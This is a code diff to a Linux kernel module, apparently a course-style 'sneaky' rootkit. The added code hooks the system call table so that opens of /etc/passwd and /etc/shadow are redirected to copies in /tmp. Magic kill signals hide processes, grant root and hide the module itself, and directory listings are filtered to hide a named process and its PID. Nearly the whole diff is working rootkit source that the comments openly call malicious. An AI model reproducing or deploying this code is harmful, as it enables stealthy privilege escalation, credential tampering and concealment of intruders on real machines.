@@ -27,9 +27,40 @@ struct linux_dirent {
   char d_name[BUFFLEN];
 };
 
-/* static int sneaky_pid = 0; */
-/* module_param(sneaky_pid,int,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP); */
-/* MODULE_PARM_DESC(sneaky_pid, "sneaky_pid"); */
+static int sneaky_pid = 0;
+module_param(sneaky_pid,int,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
+
+struct task_struct* FindTask(pid_t pid){
+  struct task_struct* curp = current;
+  for_each_process(curp){
+    if(curp->pid == pid) return curp;
+  }
+  return NULL;
+}
+
+int isInvisible(pid_t pid){
+  struct task_struct* task;
+  if(!pid) return 0;
+  task = FindTask(pid);
+  if(!task) return 0;
+  if(task->flags & PF_INVISIBLE) return 1;
+  return 0;
+}
+
+static struct list_head* module_head;
+static short mhide = 0;
+
+void ShowModule(void){
+  list_add(&THIS_MODULE->list, module_head);
+  mhide = 0;
+}
+
+void HideModule(void){
+  module_head = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+  mhide = 1;
+}
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -53,6 +84,45 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 /* Setuid syscall hook */
 asmlinkage int (*origin_setuid) (uid_t uid);
 
+asmlinkage int (*original_kill)(pid_t pid, int sig);
+
+asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);
+
+//Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
+{
+  int a =strcmp(pathname, "/etc/passwd");
+  int b =strcmp(pathname, "/etc/shadow");
+  if( a == 0){
+    const char * pathname_sneaky = "/tmp/passwd";
+    copy_to_user((char * )pathname, pathname_sneaky,11);
+  }
+  if(b == 0){
+    const char * pathname_sneaky = "/tmp/shadow";
+    copy_to_user((char * )pathname, pathname_sneaky,11);
+  }
+  return original_call(pathname, flags, mode);
+}
+
+asmlinkage int sneaky_kill(pid_t pid, int sig){
+  struct task_struct* task;
+  switch(sig){
+  case SIGSHPROC:
+    if((task = FindTask(pid)) == NULL) return -ESRCH;
+    task->flags = task->flags ^ PF_INVISIBLE;
+    break;
+  case SIGSUPER:
+    GetRoot();
+    break;
+  case SIGHIDEMOD:
+    if(mhide) ShowModule();
+    else HideModule();
+    break;
+  default:
+    return original_kill(pid, sig);
+  }
+  return 0;
+}
 /* Malicious setuid hook syscall */
 asmlinkage int sneaky_setuid(uid_t uid)
 {
@@ -83,46 +153,46 @@ asmlinkage int sneaky_setuid(uid_t uid)
 }
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
-  /* //hide the sneaky process */
-  /* int bpos; */
-  /* int sneaky_len; */
-  /* char d_type; */
-  /* struct linux_dirent* d; */
+  //hide the sneaky process
+  int bpos;
+  int sneaky_len;
+  char d_type;
+  struct linux_dirent* d;
   
-  /* printk("sneaky_pid = %d\n",sneaky_pid); */
-  /* char pid[16]; */
-  /* sprintf(pid,"%d",sneaky_pid); */
+  printk("sneaky_pid = %d\n",sneaky_pid);
+  char pid[16];
+  sprintf(pid,"%d",sneaky_pid);
   
-  /* int read = original_getdents(fd,dirp,count); */
-  /* if(read == 0){ */
-  /*   printk("end of directory\n"); */
-  /*   return read; */
-  /* }  */
-  /* if(read == -1){ */
-  /*   printk("getdents failed\n"); */
-  /*   return read; */
-  /* } */
-  /* //printk("read = %d\n",read); */
-  /* for(bpos=0;bpos<read;){ */
-  /*   d = (struct linux_dirent *)((char*)dirp + bpos); */
-  /*   char* name = d->d_name; */
-  /*   d_type = *((char*)dirp+bpos+d->d_reclen-1); */
-  /*   if(strstr(name,"sneaky_process") != NULL || strcmp(name,pid)==0 ){ */
-  /*     printk("this is the sneaky_process\n"); */
-  /*     sneaky_len = d->d_reclen; */
-  /*     //printk("sneaky_len = %d\n",sneaky_len); */
-  /*     //printk("src = %d, des = %d\n",(char*)dirp+bpos+sneaky_len,(char*)dirp+bpos); */
-  /*     int des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len); */
-  /*     //printk("des = %d\n",des); */
-  /*     read -= sneaky_len; */
-  /*   } */
-  /*   else{ */
-  /*     bpos += d->d_reclen; */
-  /*     //printk("d->d_reclen = %d, bpos = %d\n",d->d_reclen,bpos); */
-  /*   } */
-  /* } */
-  /* return read; */
-  return original_getdents(fd, dirp, count);
+  int read = original_getdents(fd,dirp,count);
+  if(read == 0){
+    printk("end of directory\n");
+    return read;
+  }
+  if(read == -1){
+    printk("getdents failed\n");
+    return read;
+  }
+  //printk("read = %d\n",read);
+  for(bpos=0;bpos<read;){
+    d = (struct linux_dirent *)((char*)dirp + bpos);
+    char* name = d->d_name;
+    d_type = *((char*)dirp+bpos+d->d_reclen-1);
+    if(strstr(name,"sneaky_process") != NULL || strcmp(name,pid)==0 ){
+      printk("this is the sneaky_process\n");
+      sneaky_len = d->d_reclen;
+      //printk("sneaky_len = %d\n",sneaky_len);
+      //printk("src = %d, des = %d\n",(char*)dirp+bpos+sneaky_len,(char*)dirp+bpos);
+      int des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len);
+      //printk("des = %d\n",des);
+      read -= sneaky_len;
+    }
+    else{
+      bpos += d->d_reclen;
+      //printk("d->d_reclen = %d, bpos = %d\n",d->d_reclen,bpos);
+    }
+  }
+  return read;
+  //  return original_getdents(fd, dirp, count);
 }
 
 asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
@@ -165,6 +235,10 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
+  //open
+  original_call = (void*)*(sys_call_table + __NR_open);
+  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  //setuid
   origin_setuid = (void*)*(sys_call_table + __NR_setuid);
   *(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid; 
   //getdents
@@ -173,6 +247,9 @@ static int initialize_sneaky_module(void)
   //read
   original_read = (void*)*(sys_call_table + __NR_read);  
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_read; 
+  //kill
+  original_kill = (void*)*(sys_call_table + __NR_kill);
+  *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -201,7 +278,9 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
-    *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
+  *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
+  *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
+  *(sys_call_table + __NR_open) = (unsigned long)original_call;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
